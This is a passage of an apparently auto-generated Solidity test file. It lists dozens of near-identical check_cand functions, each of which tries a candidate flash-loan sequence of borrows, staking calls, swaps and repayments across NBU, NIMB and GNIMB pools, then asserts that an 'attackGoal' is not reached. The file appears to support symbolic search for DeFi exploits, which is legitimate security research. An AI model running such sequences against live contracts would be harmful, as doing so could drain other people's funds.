        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3607(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3608(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3609(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3610(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3611(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3612(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3613(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3614(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3615(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3616(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3617(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3618(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3619(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3620(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3621(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3622(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3623(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3624(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3625(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3626(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3627(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3628(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3629(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3630(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3631(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3632(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3633(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3634(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3635(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3636(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3637(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3638(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3639(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3640(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3641(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3642(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3643(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3644(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3645(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3646(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3647(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3648(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3649(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3650(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3651(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3652(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
